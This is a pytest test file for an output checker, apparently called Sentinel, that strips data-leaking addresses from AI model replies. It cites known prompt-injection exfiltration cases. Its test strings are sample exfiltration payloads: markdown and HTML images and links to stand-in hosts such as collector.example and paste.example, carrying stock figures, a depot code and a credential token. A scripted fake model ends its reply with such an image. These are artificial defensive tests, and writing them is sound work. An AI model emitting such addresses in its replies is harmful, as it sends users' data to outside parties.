"""Plan Q6: the model's reply is an exit too. Addresses in a reply that carry this task's data, or an image or a query to a
place outside the slip, are removed before the reply is shown (EchoLeak, ForcedLeak, GeminiJack, AgentFlayer, Slack AI)."""

import asyncio
import json
from types import SimpleNamespace

import pytest

from sentinel import fixtures
from sentinel.chat import ScriptedModel
from sentinel.matcher import FingerprintIndex
from sentinel.output_check import check_reply
from sentinel.secret_scan import SecretIndex


def _session():
    ix = FingerprintIndex()
    ix.add(fixtures.STOCK_REGISTER if hasattr(fixtures, "STOCK_REGISTER") else "Item A: 2400 units at depot FSD-14",
           ["quantity", "depot_code", "dispatch_date"], source_ref="query_stock")
    sec = SecretIndex()
    sec.add(f"RAILWAY_TOKEN={fixtures.RUNBOOK_TOKEN}", "read_document")
    return SimpleNamespace(index=ix, secrets=sec)


SLIP = {"allowed_recipient_domains": ["shakti.example", "corp.example"]}


@pytest.mark.parametrize("reply,host", [
    ("Done. ![status](https://collector.example/p.png?d=2400)", "collector.example"),                  # EchoLeak shape
    ("See [the report](https://collector.example/r?q=FSD-14) for details.", "collector.example"),       # a link with data
    ('<img src="https://img.example/x.gif?k=2400">', "img.example"),                                    # HTML image
    ("![x][r]\n\n[r]: https://collector.example/a?d=2%2C400", "collector.example"),                     # reference-style, encoded
    (f"Token: https://paste.example/new?t={fixtures.RUNBOOK_TOKEN}", "paste.example"),                   # a found credential
])
def test_an_address_carrying_this_tasks_data_is_removed(reply, host):
    shown, found = check_reply(reply, _session(), SLIP)
    assert found and found[0].host == host and "carries data" in found[0].reasons[0]
    assert host not in shown.replace(f"to {host} removed", "") and "removed by Sentinel" in shown


def test_an_image_outside_the_slip_is_removed_even_without_data():
    shown, found = check_reply("Here you go ![logo](https://tracker.example/pixel.png)", _session(), SLIP)
    assert found and found[0].kind == "image" and "load by itself" in found[0].reasons[0]


@pytest.mark.parametrize("reply", [
    "Quotation received; I replied to sales@shakti.example.",
    "The vendor's site is https://shakti.example/catalogue?item=A",   # an allowed place, no data
    "See https://docs.python.org/3/ for the language reference.",    # a plain link outside the slip, no query, no data
    "Stock is fine. No links here.",
    "",
])
def test_ordinary_replies_are_left_alone(reply):
    shown, found = check_reply(reply, _session(), SLIP)
    assert found == [] and shown == reply


def test_with_no_session_only_the_place_matters():
    shown, found = check_reply("![x](https://tracker.example/p.png?d=2400)", None, SLIP)
    assert found and found[0].reasons == ("an image there would load by itself, to a place outside this task's slip",)


# ---- through the chat and the API ----------------------------------------------------------------------------------------
class LeakyReply:
    """A model that does its tool calls, then ends with an image whose address carries the stock figure."""
    model = "fake/leaky-reply"

    def __init__(self):
        self.calls = [
            {"role": "assistant", "content": None, "tool_calls": [{"id": "c1", "type": "function", "function": {
                "name": "read_quotation", "arguments": json.dumps({"quote_id": "Q-1043"})}}]},
            {"role": "assistant", "content": None, "tool_calls": [{"id": "c2", "type": "function", "function": {
                "name": "query_stock", "arguments": json.dumps({"item": "all"})}}]},
            {"role": "assistant", "content": "All done. ![ok](https://collector.example/ok.png?stock=2400&depot=FSD-14)"},
        ]

    async def chat(self, client, messages, tools, on_wait=None):
        return self.calls.pop(0) if self.calls else {"role": "assistant", "content": "done"}


async def test_the_chat_removes_the_leaking_image_and_says_so(stack):
    stack.rt.chats.endpoint_factory = lambda: LeakyReply()
    async with stack.api() as api:
        v = (await api.post("/api/v1/chat", json={"preset": "quotation", "mode": "live"})).json()
        cid = v["chat_id"]
        await api.post(f"/api/v1/chat/{cid}/confirm")
        await api.post(f"/api/v1/chat/{cid}/messages", json={"text": "process the quotation"})
        for _ in range(200):
            v = (await api.get(f"/api/v1/chat/{cid}")).json()
            if v["status"] == "ready" and len(v["messages"]) >= 2:
                break
            await asyncio.sleep(0.05)
    reply = v["messages"][-1]
    assert "collector.example/ok.png" not in reply["text"] and "removed by Sentinel" in reply["text"]
    assert reply["checks"] and reply["checks"][0]["host"] == "collector.example" and reply["checks"][0]["kind"] == "image"
    events = [e for e in stack.rt.bus.recent() if e.type == "reply.checked" and e.payload["chat_id"] == cid]
    assert events


async def test_other_hosts_can_ask_before_rendering(stack):
    stack.rt.chats.endpoint_factory = lambda: ScriptedModel([{"role": "assistant", "content": "hi"}], "fake/m")
    async with stack.api() as api:
        slip = (await api.post("/api/v1/slips", json={
            "objective": "Answer questions about stock", "confirm": True, "allowed_tools": ["query_stock"]})).json()
        async with stack.client(slip["header_value"].removeprefix("Bearer ")) as c:
            await c.call_tool("query_stock", {"item": "all"})
        r = (await api.post("/api/v1/check/text", json={"session_id": slip["session_id"],
                                                         "text": "![x](https://evil.example/a.png?n=2400)"})).json()
        assert r["safe"] is False and r["removed"][0]["host"] == "evil.example" and "evil.example/a.png" not in r["text"]
        ok = (await api.post("/api/v1/check/text", json={"session_id": slip["session_id"], "text": "Stock is fine."})).json()
        assert ok == {"safe": True, "text": "Stock is fine.", "removed": []}
        assert (await api.post("/api/v1/check/text", json={"session_id": "ses_nope", "text": "x"})).status_code == 404
